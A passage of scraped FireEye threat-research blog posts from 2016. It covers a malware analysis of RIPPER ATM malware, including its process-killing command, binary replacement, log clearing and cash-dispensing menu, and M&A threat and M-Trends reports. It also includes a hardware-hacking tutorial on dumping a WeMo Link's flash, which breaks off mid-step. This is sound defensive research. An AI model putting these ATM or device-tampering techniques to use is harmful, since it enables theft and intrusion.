  for individuals, not teams, and there are no parallel tracks of challenges.</p>
 <p>Contestants who finish all 10 challenges prior to Nov. 4 will
  receive the prize and recognition on the website. Last year’s prize
  was a big custom rodeo-style belt buckle and the previous year’s prize
  was a challenge coin. This year’s prize is a surprise and will be
  announced after the close of the contest.</p>
 <p>A live countdown timer on our <a href=""http://www.flare-on.com"">website</a> is ticking away the moments
  until the third annual contest begins, and visitors to the site can
  also marvel at the splendor and glory of last year’s winners.
  Additionally, you can share your enthusiasm on Twitter with #flareon3.</p>",http://www.fireeye.com/blog/threat-research/2016/09/_announcing_the_thir.html
RIPPER ATM Malware and the 12 Million Baht Jackpot,"<p>On Aug. 23, 2016, FireEye detected a potentially new ATM malware
  sample that used some interesting techniques not seen before. To add
  more fuel to an existing fire, the sample was uploaded to VirusTotal
  from an IP address in Thailand a couple of minutes before the Bangkok
  Post newspaper reported the theft of 12 million baht from ATMs at
  banks in Thailand.</p>
 <p>In this blog, FireEye Labs dissects this new ATM malware that we
  have dubbed <b>RIPPER</b> (due to the project name “ATMRIPPER”
  identified in the sample) and documents indicators that strongly
  suggest this piece of malware is the one used to steal from the ATMs
  at banks in Thailand.</p>
 <h4>Connection to previous ATM Malware</h4>
 <ul> <li>Targets the same ATM brand.</li> <li>The technique used to
    expel currency follows the same strategy (already documented)
    performed by the <a href=""https://www.symantec.com/security_response/writeup.jsp?docid=2014-051213-0525-99&amp;tabid=2"" style=""font-size: 12.0px; line-height: 1.538;""><b>Padpin</b></a><span style=""font-size: 12.0px; line-height: 1.538;""> (Tyupkin), </span>
    <b style=""font-size: 12.0px; line-height: 1.538;"">SUCEFUL</b>
    <span style=""font-size: 12.0px; line-height: 1.538;""> and </span>
    <a href=""https://www.proofpoint.com/us/threat-insight/post/Meet-GreenDispenser"" style=""font-size: 12.0px; line-height: 1.538;""><b>GreenDispenser</b></a>.</li>
    <li>Similar to <b style=""font-size: 12.0px; line-height: 1.538;"">SUCEFUL</b>, it is
    able to control the Card Reader device to Read or Eject the card on
  demand.</li> <li>Can disable the local network interface, similar to
    capabilities of the <b style=""font-size: 12.0px; line-height: 1.538;"">Padpin
  </b>family.</li> <li>Uses the “sdelete” secure deletion tool, similar
    to <b style=""font-size: 12.0px; line-height: 1.538;"">GreenDispenser</b>, to
    remove forensic evidence.</li> <li>Enforces a limit of 40 bank notes
    per withdrawal consistently, which is the maximum allowed by the ATM
  vendor.</li> </ul>
 <h4>New features, capabilities, or behaviors in RIPPER</h4>
 <ul> <li>It targets three of the main ATM Vendors worldwide, which is a
  first.</li> <li>RIPPER interacts with the ATM by inserting a specially
    manufactured ATM card with an EMV chip that serves as the
    authentication mechanism. Although this technique was already used
    by the <a href=""http://news.drweb.com/show/?i=4167&amp;lng=en"" style=""font-size: 12.0px; line-height: 1.538;""><b>Skimmer</b></a><span style=""font-size: 12.0px; line-height: 1.538;""> family, it is an
      uncommon mechanism.</span></li> </ul>
 <h4>Similarities between RIPPER and the recent ATM theft in Thailand</h4>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Table3.png"" /></p>
 <h4>RIPPER analysis</h4>
 <p>MD5: 15632224b7e5ca0ccb0a042daf2adc13</p>
 <p>
  <i>RIPPER Persistence:</i></p>
 <p>RIPPER can maintain persistence using two modes: either as
  standalone service or masquerading as a legitimate ATM process.</p>
 <p>RIPPER is installed as a service if called with the following arguments:</p>
 <p>
  <b>service install</b></p>
 <p>Before creating the service, it will kill the process “dbackup.exe”,
  which is specific to one common ATM vendor:</p>
 <p>
  <b>cmd /c taskkill /IM dbackup.exe /T /F</b></p>
 <p>Then it will replace the original dbackup.exe binary under
  c:\Windows\system32\ (if present) with itself.</p>
 <p>Finally it will install a persistent service with following attributes:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Code1.png"" /></p>
 <p>RIPPER can delete the “DBackup Service” service if run with the
  following arguments:</p>
 <p>
  <b>service remove</b></p>
 <p>RIPPER can stop or start the “DBackup Service” with the following arguments:</p>
 <p>“<b>service start” or “service stop”</b></p>
 <p>RIPPER also supports the following command line switches:</p>
 <p>
  <b>/autorun</b>: Will Sleep for 10 minutes and then run in the
  background, waiting for interaction.</p>
 <p>
  <b>/install</b>: RIPPER will replace the ATM software running on the
  ATM as follows:</p>
 <p>Upon execution, RIPPER will kill the processes running in memory for
  the three targeted ATM Vendors via the native Windows “taskkill” tool.</p>
 <p>RIPPER will examine the contents of directories associated with the
  targeted ATM vendors and will replace legitimate executables with
  itself. This technique allows the malware to maintain the legitimate
  program name to avoid suspicion.</p>
 <p>RIPPER will maintain persistence by adding itself to the
  \Run\FwLoadPm registry key (that might already exist as part of the
  vendor installation), passing the “/autorun” parameter that is
  understood by the malware, as seen in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig1.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Registry key added for persistency</span></p>
 <p>
  <b>/uninstall</b>: RIPPER removes the registry keys created</p>
 <h4>Running without parameters</h4>
 <p>If RIPPER is executed without any parameters, it will perform the
  following actions:</p>
 <p>1.     It will connect with the Cash Dispenser, Card Reader and the
  Pinpad. Since every ATM brand has its own unique devices names, RIPPER
  will identify the current devices installed by enumerating them under
  the following registry key:</p>
 <p>
  <b>HKEY_USERS\.DEFAULT\XFS\LOGICAL_SERVICES\</b></p>
 <p>2.     RIPPER will make sure the devices are available by querying
  their status (Figure 2), and if not available, will exit.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Querying the devices status via
    WFSGetInfo() API</span></p>
 <p>3.     For the Dispenser it will obtain information such as the Cash
  Unit details to determine the number and type of available notes.</p>
 <p>4.     Finally it starts two threads; the first of which will
  monitor the status of the ATM devices to make sure they are available
  and will read all the keystrokes received from the Pinpad device
  waiting to interact with the thieves (see step 7), as seen in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Monitoring Pinpad keystrokes</span></p>
 <p>5.     The second thread monitors the Card Reader, and once a card
  is inserted it validates the EMV chip for authentication to the ATM Malware.</p>
 <p>6.     Once a valid card with a malicious EMV chip is detected,
  RIPPER will instantiate a timer to allow a thief to control the
  machine. Figure 4 depicts the timer function.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Monitoring the Card Reader</span></p>
 <p>7.     Once the thieves start interacting with RIPPER, they enter
  instructions via the Pinpad and multiple options are displayed,
  including methods for dispensing currency. Figure 5 depicts some of
  the options available to the thieves.</p>
 <p>a.     <b>CLEAN LOGS</b>: Will clear the log stored at: C:\WINDOWS\temp\clnup.dat</p>
 <p>b.     <b>HIDE</b>: Will hide the Malware GUI by calling
  ShowWindow() API.</p>
 <p>c.     <b>NETWORK DISABLE</b>: Will shut down the ATM local network
  interface to prevent it from communicating with the bank. It can
  re-enable the connection if needed.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Main Menu</span></p>
 <p>d.     <b>REBOOT</b>: Will call ExitWindowsEX() API without sending
  WM_QUERYENDSESSION message to avoid prompts for confirmation, causing
  the system to reboot. </p>
 <p>e.     <b>BACK</b>: Ejects the malicious ATM card back to the
  thieves by calling the WFSExecute() with the command:
  WFS_CMD_IDC_EJECT_CARD. This option, depicted in Figure 6, was
  observed being used by the SUCEFUL family.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ripper/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Asking Card Reader to eject the chip card</span></p>
 <h4>Conclusion</h4>
 <p>Through open sources, we’ve identified a family of malware that may
  have been used in recent ATM robberies and which bears some
  similarities to known families of malware. This malware family can be
  used to compromise multiple vendor platforms and leverages uncommon
  technology to access physical devices. In addition to requiring
  technical sophistication, attacks such as that affecting the ATMs in
  Thailand require coordination of both the virtual and the physical.
  This speaks to the formidable nature of the thieves.</p>",http://www.fireeye.com/blog/threat-research/2016/08/ripper_atm_malwarea.html
"M-Trends Asia Pacific: Organizations Must Improve at Detecting and
Responding to Breaches","<p>Since 2010, Mandiant, a FireEye company, has presented trends,
  statistics and case studies of some of the largest and most
  sophisticated cyber attacks. In February 2016, we released our annual
  global <a href=""https://www.fireeye.com/current-threats/annual-threat-report/mtrends.html"">M-Trends®
  report</a> based on data from the breaches we responded to in 2015.
  Now, we are releasing <a href=""https://www2.fireeye.com/m-trends-2016-asia-pacific.html"">M-Trends
    Asia Pacific</a>, our first report to focus on this very diverse and
  dynamic region.<img class=""float-right"" src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/apc%20mtrends%20smallest.jpg"" />
  <span class=""float-right""></span></p>
 <p>Some of the key findings include:</p>
 <ul> <li>
    <b>Most breaches in the Asia Pacific region never became public.
    </b>Most governments and industry-governing bodies are without
    effective breach disclosure laws, although this is slowly
  changing.</li> <li>
    <b>The median time of discovery of an attack was 520 days after the
      initial compromise.</b> This is 374 days longer than the global
    median of 146 days.</li> <li>
    <b>Mandiant was engaged by many organizations that have already
      conducted forensic investigations (internally or using third
      parties), but failed to eradicate the attackers from their
      environments. </b>These efforts sometimes made matters worse by
    destroying or damaging the forensic evidence needed to understand
    the full extent of a breach or to attribute activity to a specific
    threat actor.</li> <li>
    <b>Some attacker tools were used to almost exclusively target
      organizations within APAC.</b> In April 2015, we uncovered the
    malicious efforts of APT30, a suspected China-based threat group
    that has exploited the networks of governments and organizations
    across the region, targeting highly sensitive political, economic
    and military information.</li> </ul>
 <p>Download <a href=""https://www2.fireeye.com/m-trends-2016-asia-pacific.html"" target=""_blank"">M-Trends
    Asia Pacific</a> to learn more.</p>",http://www.fireeye.com/blog/threat-research/2016/08/m-trends_asia_pacifi.html
"Unsealing the Deal: Cyber Threats to Mergers and Acquisitions Persist in
a Hot Market","<h5>Risks Posed by Sensitive Corporate Communications, Broadened Attack Surface</h5>
 <p>In 2015, a record $5 trillion dollars was tied up in mergers and
  acquisitions (M&amp;A) deals, according to <a href=""https://www.jpmorgan.com/country/US/EN/insights/maglobaloutlook"">JP
  Morgan</a>. So far, mega deals in 2016 include Microsoft’s purchase of
  LinkedIn, Shire’s acquisition of Baxalta, and Marriott’s acquisition
  of Starwood. These market-moving events often involve a massive
  expenditure of capital and are largely conducted in secret to comply
  with legal requirements, making them attractive targets for
  cybercriminals and nation-state threat groups alike. Threat actors are
  primarily driven by three motives related to M&amp;A activity:</p>
 <ol> <li>Stealing non-public information leading up to the deal’s
    announcement for future financial gain.</li> <li>Exploiting
    sensitive financial information generated during the M&amp;A
  process.</li> <li>Exploiting the increased attack surface created by
    companies combining their operations.</li> </ol>
 <p>Additionally, acquisition targets may be compromised prior to the
  M&amp;A for reasons wholly unrelated to the transaction. Enterprises
  should be especially alert for malicious cyber activity before,
  during, and shortly after M&amp;A-related activities, ensuring that
  due-diligence processes incorporate assessments of each party’s cyber
  security practices.</p>
 <h5>Trove of Documents to Exploit Capital Markets</h5>
 <p>M&amp;A activity generates significant amounts of sensitive
  corporate communications, which cyber criminals may attempt to obtain
  and exploit for financial gain. For example, cyber criminals could
  attempt to gather data about a company's operations, financial status
  or future plans, which could then be used in stock market trades. To
  obtain such sensitive information, attackers can target the companies
  directly involved in the M&amp;A activity themselves or other
  organizations involved in the deal, such as law firms and PR agencies.</p>
 <p>The <a href=""https://www.sec.gov/news/pressrelease/2015-163.html"">U.S.
    Securities and Exchange Commission (SEC) in 2015 announced</a> that
  since at least 2010, two Ukrainian cyber criminals breached multiple
  newswire services and distributed pre-release information to a rogue
  network of international traders and hedge fund managers.</p>
 <p>In 2013 and 2014, a group of cyber criminals known as <a href=""https://www2.fireeye.com/rs/fireye/images/rpt-fin4.pdf"">FIN4</a>
  sought to acquire information about M&amp;A discussions in order to
  game the stock market. The group frequently used M&amp;A and
  SEC-themed lures with Visual Basic for Applications (VBA) macros
  implemented to steal the usernames and passwords of key individuals.
  Many of FIN4’s lures were apparently stolen documents from actual deal
  discussions that the group then weaponized and sent to individuals
  directly involved in the deal. FIN4 typically included links to fake
  Outlook Web App (OWA) login pages designed to capture the user’s
  credentials. Once equipped with the credentials, FIN4 then obtained
  access to real-time email communications and presumably insight into
  potential deals and their timing.</p>
 <h5>Seeking Insights to Gain the Upper Hand in Negotiations</h5>
 <p>One side involved in M&amp;A negotiations could use cyber espionage
  to acquire sensitive information about a deal counterparty in an
  attempt to obtain more favorable terms. Based on past threat actor
  activity, we have observed multiple China-based threat actors breach
  companies to observed this type of activity in sizeable deals
  involving Chinese state-owned enterprises.  </p>
 <p>High tech companies in particular face an evolving cyber risk as
  Chinese interests advance toward acquisition of technology and
  expertise that will sustain the country’s economic growth through a
  shift to an economy built on knowledge-based products and services.
  During the past decade, flush with cash and often with state backing,
  Chinese companies have snatched up well-known Western companies in
  industries ranging from agriculture to energy to consumer products.
  The Wall Street Journal reported that as of May 2016, Chinese
  companies have struck over $110.8 billion in overseas deals,
  surpassing the $106.8 billion in deals done in 2015, despite a
  slowdown in the Chinese economy.</p>
 <p>As recently as late 2015, we have observed several likely
  China-based threat groups targeting companies engaged in
  M&amp;A-related activity. At least four different China-based APT
  groups conducted computer network intrusions that we believe were
  primarily motivated by the targeted companies’ involvement in an acquisition.</p>
 <p>In 2015, Mandiant conducted a compromise assessment for a business
  services company. We identified two periods of activity by the
  China-based threat group APT8 within the network, the most recent of
  which coincided with the victim company's participation in acquisition
  negotiations. Although our visibility into APT8's operations was
  limited, the threat group possibly sought information pertaining to
  the negotiation and acquisition itself, based on the timing in which
  APT8 resumed their activity within the network.</p>
 <h5>New Companies, New Attack Surfaces</h5>
 <p>Mergers and acquisitions often result in an increased attack surface
  for the companies involved. As two or more companies integrate their
  IT assets, a group that has compromised one company could potentially
  use that access to compromise the other(s). For instance, the <a href=""http://www.reuters.com/article/us-telstra-pacnet-cybercrime-idUSKBN0O50WM20150520"">Australian
    telecom firm Telstra in 2015</a> announced that the networks of a
  recently acquired subsidiary, Pacnet, were exploited.</p>
 <p>Although the most obvious example of the increased attack surface
  issue is when M&amp;A activity causes companies to combine their
  networks, it can also include factors such as one company’s particular
  susceptibility to social-networking attacks or vulnerabilities in
  products produced by one of the companies. In other words, strong
  security practices at one company can be obviated by poor practices at
  the other.</p>
 <p>This threat is likely elevated during and immediately after a merger
  or acquisition, since IT employees at the purchasing company may not
  have had time to analyze the security posture of the purchased
  company, or the combined staffs are unable to comprehensively monitor
  the entirety of the newly combined network. Mergers and acquisitions
  also generally increase the opportunities for “lateral compromise” by
  targeting trusted relationships (i.e., the relationship between the
  companies involved in the M&amp;A activity). When a well protected
  network recognizes a less secure network as trusted, the overall
  security posture of the combined network is lowered, allowing
  intruders to gain access by exploiting hastily-granted trust between systems.</p>
 <p>Mandiant has observed instances where APT actors were able to regain
  a foothold in an organization’s network following remediation by
  compromising the network of an affiliate. Actors targeting companies
  during M&amp;A activity could use similar tactics to move laterally
  from one company to another.</p>
 <p>An example of this is when Mandiant performed an incident response
  investigation for Company A, where we identified the presence of
  several advanced threat actors. After remediating Company A’s
  networks, an APT group attempted to re-compromise the network through
  a sister organization (Company B), which had also been previously
  compromised. Although this effort failed, a different APT group was
  able to regain access to Company A’s systems through a strategic web
  compromise embedded on Company B’s website. Our investigation of the
  sister company’s network revealed that the vast majority of stolen
  data there pertained to the network infrastructure linking the organizations.</p>
 <p>Another example occurred at Company C, where we identified four APT
  groups active in a network. Analysis about the timing and behavior of
  at least one of these groups suggested that they were able to leverage
  their previously attained access at Company D (a sister organization)
  to access Company C’s network. During our investigation at Company D,
  we discovered at least two threat groups, with activity dating back
  three years earlier. We believe these actors used information
  harvested from Company D’s network to help exploit Company C in a
  subsequent operation.</p>
 <h5>Mitigation</h5>
 <p>Business leaders responsible for M&amp;A business strategy should be
  aware that threat actors often target companies engaged in mergers and
  acquisitions, and that malicious activities such as phishing attacks
  will likely increase during such periods. Additionally, a data breach
  or severe security posture weaknesses could negate the business
  strategy of acquisition due to the often-high cost of fixing
  weaknesses or conducting incident response. Technology risk should be
  evaluated and incorporated into the overall business risk strategy
  before an M&amp;A transaction is completed. In addition, companies
  engaged in M&amp;A should ensure that an examination of cyber security
  is included as a key component of the due diligence process.</p>
 <p>Today cyber due diligence is oftentimes performed superficially and
  as an afterthought. This examination should include details of the
  company’s security capabilities such as data safeguards, access
  controls, threat detection, incident response and infrastructure
  security controls, the threat landscape of the organization, any
  records of past attacks, and any underground actors known to be
  particularly interested in targeting the company. Allowing sufficient
  time (four to six weeks) to perform an actual compromise assessment on
  the sellers’ infrastructure will provide the optimal visibility into
  the security posture of the acquisition.</p>
 <p>When sufficient time is provided and cyber due diligence is
  conducted, senior executives at the acquiring organization will
  understand the business threats and technology risk posed by the
  acquisition target, enabling them to incorporate this information into
  the overall enterprise risk picture for informed decision-making. In
  the majority of transactions, the decision to move forward with the
  acquisition will still continue; however, senior executives will be
  better equipped to make informed decisions about:</p>
 <ul> <li>Deal value</li> <li>Terms</li> <li>Cost of remediation of
    security weaknesses or breach response</li> <li>Return on investment
    of the acquisition</li> <li>Purchase of a cyber insurance to
    transfer risk</li> <li>Probability and cost of future litigation
    resulting from a breach</li> </ul>
 <h5>When to Start Cyber Security Due Diligence</h5>
 <p>It’s important for all parties to a transaction to work with their
  respective counsel to ensure any cyber due diligence activities are
  performed in a compliant manner (e.g., to avoid creating privacy
  issues) and in a way that helps preserve any available legal privileges.</p>
 <p>Cyber security should be planned for like any other due diligence –
  as early as possible. Because of some fairly specific requirements to
  ensure the quality of cyber security due diligence, some language may
  need to be inserted into agreement documents such as a Letter of
  Intent (LOI). This will enable key components of a cyber security due
  diligence, such as network monitoring.</p>
 <p>M&amp;A due diligence teams sometimes contain information technology
  (IT) subject matter experts (SMEs) who are occasionally asked to also
  provide an opinion on cyber security posture; however, cyber security
  is a specialized field, and if security expertise is not available on
  staff, due diligence providers should start planning to retain outside resources.</p>
 <h5>What Cyber Security Due Diligence Should Be</h5>
 <p>The following are factors that should be incorporated into effective
  cyber security due diligence planning. Note that M&amp;As can vary
  widely in terms of ramp-up time. Some allow for a very short due
  diligence effort, while longer deals can afford months to assess risk.
  Business decisions control this pace, not the due diligence team –
  therefore it is important to have relatively quick and lightweight
  cyber due diligence options as well as longer, more in-depth approaches.</p>
 <p>
  <u>Quick Diligence</u></p>
 <p>If the window for due diligence is short (e.g., 1-2 weeks), there is
  still substantial cyber security due diligence that can be
  accomplished to provide a high-level view of the risk levels of the
  seller’s environment. A week provides time for cyber security experts
  to conduct documentation review and interviews with seller staff,
  which they then analyze in a focused risk framework. The product of
  this activity should be a quantified risk assessment across important
  cyber security domains (e.g., data safeguarding, infrastructure
  security, and others) that results in a brief, easy-to-understand
  report on risk and general recommendations for the buyer.</p>
 <p>Even minimal cyber security due diligence should have a technical
  component to provide an objective view of the health of the seller’s
  security posture. One of the most important aspects of a technical
  assessment is creating a historical scorecard going back in time: Have
  the seller’s computers been compromised in the past, and what was the
  character of those breaches (advanced and persistent, commodity,
  insider, financial fraud, etc.)? The Freshfields survey discovered <b>
    <i>90%</i></b> of respondents believed that a past breach could
  reduce the value of a deal.</p>
 <p>Also important is a current snapshot: detecting malicious activity
  (or the lack of such activity) from the seller provides insight into
  the overall security posture and types of possible intruders already
  in place. This information needs to be derived and analyzed in a
  relatively short time frame.  With this kind of analysis, the buyer
  already can act knowledgably and prevent major missteps.<u></u></p>
 <p>
  <u>In-Depth Due Diligence</u></p>
 <p>If more time is available, more detailed and granular cyber security
  due diligence is possible. In addition to a risk assessment conducted
  by cyber security analysts, software agents can be deployed in the
  seller’s network to report on the state of the endpoints.</p>
 <p>Network monitoring can examine traffic to and from the network for a
  period of time to collect very detailed information on the state of
  the organization’s cyber security and what compromises are already
  happening, or have already happened. This allows the buyer to know the
  seller’s environment inside and out from a real-world risk
  perspective, and would provide both the high-level view needed to
  inform decisions and granular detail to estimate remediation costs.</p>
 <p>Only with due diligence can risk be incorporated in planning, with
  various planned costs and benefits. Without due diligence, there are
  only unexpected costs and reputational impacts.</p>
 <h5>Post-Acquisition Activities</h5>
 <p>Information gathered during due diligence can be further used to
  guide post-acquisition activities.</p>
 <p>
  <u>Integration</u></p>
 <p>A fairly common follow-on activity, particularly with mergers, is
  integration of the two companies’ IT infrastructure. In the long run,
  this should reduce costs and ease management; however, in the
  short-term it can create its own set of problems and become a
  long-term effort.</p>
 <p>One of the first questions to answer is: what can be trusted? Is it
  safe for the buyer to connect to certain acquired systems? Can two-way
  trust relationships be established? All of these depend on assessing
  the security of both the overall environment and specific systems.
  Cyber security due diligence provides a good start down this road, and
  can allow for a level of effort and cost estimates to be made and
  included in IT planning.</p>
 <h5>The Future Has Already Been Here</h5>
 <p>The impact of adverse cyber security events has been felt by
  businesses for some time, and paying a little attention to the news
  gives some sense of the scale of the challenges that have emerged as
  even local businesses become exploitable by global criminals. Cyber
  security risk is not science fiction, even though it has essentially
  been treated as science fiction by being left out of M&amp;A
  processes. Acquiring companies and due diligence practitioners must
  now catch up to the reality of the costs and risks that cyber security
  issues create, and the benefits that cyber security due diligence can
  bring. Doing so will eventually separate successes from the also-rans.</p>
 <p>For more information on how Mandiant Consulting can help before,
  during and after a merger or acquisition, visit <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services.html"" target=""_blank"">Fireeye.com/services.html.</a></p>",http://www.fireeye.com/blog/threat-research/2016/08/unsealing_the_deal.html
Embedded Hardware Hacking 101 – The Belkin WeMo Link,"<h4>Why Embedded Hacking?</h4>
 <p>Devices that are connected to the Internet or run a full operating
  system are becoming more and more prevalent in today’s society. From
  devices for locomotives to wireless light switches, the Internet of
  Things (IoT) trend is on the rise and here to stay. This has the
  potential to make our lives much easier; however, the increasing
  sentience of once analog devices also enables adversaries to target
  them and potentially misuse them.</p>
 <p>With the ubiquity of these Internet-connected devices, there is a
  surplus of “Things” to exploit. The main intent of this blog post is
  to generalize how an individual would reverse engineer an embedded
  device and the process for attempting to find vulnerabilities.</p>
 <p>For this demonstration, we will be looking at the WeMo Link, which
  is a part of the Belkin WeMo LED Lighting Starter Set
  (http://www.belkin.com/us/p/P-F5Z0489/). There have been
  vulnerabilities identified in previous iterations of this device;
  however, these vulnerabilities were more focused on the web services
  component and not based on analyzing the built-in security of the
  physical components.</p>
 <h4>Steps to Analyzing Hardware</h4>
 <p>There are several steps that an analyst should take when examining
  their device. These steps, at a high-level, are:</p>
 <ol> <li>Research the device</li> <li>Identify the components</li>
    <li>Identify debugging ports</li> <li>Dump the flash</li>
    <li>Extract/analyze firmware</li> </ol>
 <p>These steps are crucial to understanding the device being analyzed
  and are required to help identify vulnerabilities. In the following
  scenario, I will walk through the aforementioned steps and explain
  each, the path I took, and what other potential sub-paths one could
  take, given their specific scenario.</p>
 <h5>Research the Device</h5>
 <p>The scope of this project involved examining IoT embedded hardware
  devices that primarily ran embedded Linux as its operating system. I
  looked at several IoT devices and decided on the WeMo Link due to its
  ability to be controlled by a mobile application and to be used for
  home automation, its utilization of wireless components, and its
  ability to be controlled over the Internet.</p>
 <p>The WeMo product allows a mobile application to dim or turn the
  bulbs on and off remotely, or add a bit of intelligence to the bulbs
  by having them sync with the sunrise or sunset automatically. There
  are two main components that drive the device: the WeMo Link and the
  WeMo bulb. The WeMo Link is comprised of a WiFi 2.4GHz radio component
  as well as a ZigBee component that communicates on the same band. In
  terms of the software, the user downloads a mobile application for
  their Android or iOS device to initially setup the WeMo Link, which
  then allows them to control the WeMo bulb.</p>
 <p>When initially setup, the WeMo Link broadcasts its SSID of
  “WeMo.Bridge.XXX”. The user then connects to this AP (Access Point)
  with their mobile device, shares the user’s wireless AP credentials,
  and the WeMo takes care of the rest. The WeMo then takes any command
  sent from the mobile application, sends it to the user’s router, to
  the WeMo Link, and then transmits the command over ZigBee to execute
  the command to the appropriate bulb(s). Pretty simple.</p>
 <h5>Identify the Components</h5>
 <p>In this example, the brains of the operation appear to be the WeMo
  Link component. In order to be certain, we need to take the device
  apart. The lid easily pops off by applying force with a flathead under
  the lip of the plastic. There are several ways of identifying how to
  properly disassemble a device – from identifying pull tabs to
  uncovering screws that are covered with warranty warning tape. In this
  case, the device had a slightly protruding lid held down by four tabs.
  Behind the plastic lid were two main components: the mainboard, and
  the AC/DC converter consisting of a transformer, rectifier, etc.</p>
 <p>As we examine the mainboard, we will need to identify the datasheets
  associated with each component in order to get a better idea as to how
  the device works. On the mainboard itself, what is immediately visible
  (we will remove the shielding in a bit) is a Winbound W9825G6KH-61
  (https://www.winbond.com/resource-files/da00-w9825g6khc1.pdf) 32MB
  SDRAM and a Winbound 25Q128FVSG
  (https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf)
  16MB serial NOR flash memory with the ability to communicate over SPI
  (Serial Peripheral Interface) (this will be important later), as seen
  in Figure 1. The latter chip is used for storing the more permanent
  memory on the board, even while the device is powered off.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig1.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Winbound 25Q128FVSG flash memory</span></p>
 <p>After removing the two metal pieces of shielding on the
  opposite-side of the board (easily pried-off with a flathead screw
  driver), we uncover three more main components.</p>
 <p>As seen in Figure 2, the first chip is a SoC (System-on-a-Chip)
  Ralink RT5350F
  (https://cdn.sparkfun.com/datasheets/Wireless/WiFi/RT5350.pdf), which
  is a MIPS embedded processor commonly used for networking devices and
  supports SPI communication, 360 MHz MIPS24KEc CPU core, 802.11n
  wireless communication, and more. This component is used to drive the
  device’s main functions, communicate over its debugging interface,
  interact with its ZigBee component, and communicate with our router
  over its built-in Wi-Fi component.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Ralink RT5350F chip</span></p>
 <p>As shown in Figure 3, the other shielded section contains the SoC
  for the ZigBee device labeled as Silicon Labs EM357
  (https://www.silabs.com/Support%20Documents/TechnicalDocs/EM35x.pdf),
  which handles all of the ZigBee 2.4GHz communication and processing
  power (32-bit ARM Cortex M3 processor) used to relay information to
  and from the WeMo light bulbs. The other chip residing in the same
  section is a SkyWorks SKY65336
  (http://www.skyworksinc.com/uploads/documents/200939H.pdf)
  transmit/receive front-end module used for the ZigBee transmission,
  which appears to be utilized by the aforementioned Silicon Labs EM357
  ZigBee SoC to perform the actual transmission of the data to the light bulbs.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig3.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Silicon Labs EM357 chip</span></p>
 <h5>Identify Debugging Ports</h5>
 <p>When debugging/interacting with a device, the two most common ways
  consist of JTAG (Joint Test Action Group) and UART (Universal
  Asynchronous Receiver/Transmitter). JTAG is a dedicated debugging port
  implemented as a serial interface used for communicating with the
  target device. UART is a means of serial communication that can easily
  be bridged over USB via any UART-to-USB bridge. When looking for UART
  communication, a lot of times you will see three to four pins that are
  grouped together with tracings routed to other parts of the board. To
  help us identify these pins, we can use a multimeter. By touching each
  of the suspect pins with the positive end on the pad and negative end
  to a ground (such as the shielding), we can monitor the voltage and
  identify what the pins are. However, in this case, the WeMo’s circuit
  board silk screening was friendly enough to label exactly what pads
  were utilized for interfacing with the device. They were labeled
  conveniently as UART_RX, UART_TX, GND, and VCC, as seen in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig4.png"" /></p>
 <p>Figure 4: Accessible UART pads found on board</p>
 <p>To be sure that the labels are accurate, we can still utilize the
  multimeter to test each pad’s connection. By powering up the device
  and monitoring each pin, the UART_RX oscillated throughout a series of
  voltages. This indicates that data is being streamed across this pad,
  which is what we will later utilize to view the device’s console.
  UART_TX is utilized for transmitting commands to the device and can be
  a bit tricky to identify. This pad also displayed as 3.3V, but given
  its placement, I did not anticipate this to be VCC. VCC sometimes will
  also have a thicker trace than the other pads, indicating it is used
  for supply power. The GND pad provided 0 volts on the multimeter,
  implying it was the ground pin, and the VCC supplied a steady 3.3
  volts, implying it was the power pad. We will utilize these
  connections later on after we analyze the extracted firmware from the
  flash dump.</p>
 <h5>Dump the Flash</h5>
 <p>As mentioned earlier in the WeMo teardown section of this post, we
  identified the flash memory that is used to store the bootloader and
  firmware for this device. This is the core component of the device
  that an attacker would attempt to modify. We have two ways to dump the
  memory off of this component, and I will highlight one method. These
  methods consist of: connecting a test clip to the chip itself while it
  is still soldered to the board and utilizing a tool such as the bus
  pirate to dump the flash memory, or desoldering the chip and then
  placing the chip in a programmer to read the memory off of the chip.</p>
 <p>For the sake of being as hardware-oriented as possible, I went with
  the method of dumping of the SPI flash memory via the bus pirate
  without desoldering the chip. I wanted to take a non-invasive approach
  such that my analysis might not be discovered (no physical
  modifications) by the naked eye. For this method, I purchased a bus
  pirate from Dangerous Prototypes and an SOIC8/SOP8 test clip (these
  stand for different types of chip packages, meaning small outlined
  integrated circuit and small outlined package). This particular flash
  chip fit perfectly with my 8-pin test clip and was used to make a
  connection while not removing the chip from the board. I then
  correctly wired the chip with respect to the bus pirate ports, while
  following the datasheet and pinout of the chip, as seen in Figure 5.</p>
 <p>
